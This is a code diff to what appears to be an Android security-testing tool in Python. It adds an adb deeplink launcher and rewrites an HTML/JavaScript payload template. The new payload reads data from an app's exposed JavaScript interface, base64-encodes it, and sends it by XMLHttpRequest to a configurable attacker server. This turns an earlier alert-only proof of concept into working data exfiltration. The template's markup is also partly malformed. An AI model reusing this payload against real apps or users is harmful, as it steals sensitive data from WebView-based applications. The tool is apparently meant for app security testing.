@@ -5,6 +5,8 @@ from time import sleep
 import time
 from colorama import Fore
 import os
+
+from Classes.commands import Commands
 from .constants import Constants
 
 class OtherTools:
@@ -47,10 +49,19 @@ class OtherTools:
             "extras": [],
             "path": Constants.DIR_LOOT_PATH.value
         }
+
+        self._deeplink = ""
         self.backup_files = {}
         self._init_backup_constants()
         self._init_tools()
     
+    def open_deeplink(self):
+        final_command = f'{Constants.ADB.value} shell am start -d {self._deeplink}'.split()
+        print(Commands.LAUNCH_DEEPLINK.value["display"] + "\nCommand used: " + f'{Constants.ADB.value} shell am start -d {self._deeplink}' + Fore.RESET)
+        output = subprocess.run(final_command, stdout=DEVNULL, stderr=PIPE).stderr.decode()
+        if "exception in module" in output:
+            print(Fore.RED + "[-] No Activity found to handle Intent { act=android.intent.action.VIEW dat="+ self._deeplink + " flg=0x10000000 (has extras) }" + Fore.RESET)
+
     def _init_backup_constants(self):
         self._abe = f'java -jar {os.path.join(Constants.DIR_UTILS_PATH.value, "abe.jar")}'
         self.backup_files["restore_tar"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.NEWBACKUP_NAME_TAR.value)
@@ -151,23 +162,27 @@ class OtherTools:
         """,
             "payload": f"""
             <!DOCTYPE html>
-                <html>
+            <html>
+            <body>
+                <script>
+                    var data = window.{self._generate_deeplink_data['js_interface']};
+                        function sendBase64Value(base64Value) {{
+                        const url = `{self._generate_deeplink_data['server']}?encodedValue=${{encodeURIComponent(base64Value)}}`;
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', url, true);
+                        xhr.onload = function() {{
+                            console.log('Request sent successfully');
+                        }};
+                        xhr.onerror = function() {{
+                            console.error('Error sending request');
+                        }};
+                        xhr.send();
+                    }}
+                    const base64Encoded = btoa(data);
+                    sendBase64Value(base64Encoded);
+                </script>
                 <head><title>Read sensitive data</title>
-                    <script type="text/javascript">
-                        var data;
-                        if(window.Android){{
-                            data = window.Android.{self._generate_deeplink_data['js_interface']}();
-                        }}
-                        if(data) {{
-                            alert("Stolen data: " + data);
-                            document.write("Stolen data: " + data);
-                        }}
-                    </script>
-                </head>
-                <body style="text-align: center;">
-                    <h1>Stealing Sensitive Data</h1>    
-                </body>
-                </html>
+            </body>
 
             """
         }
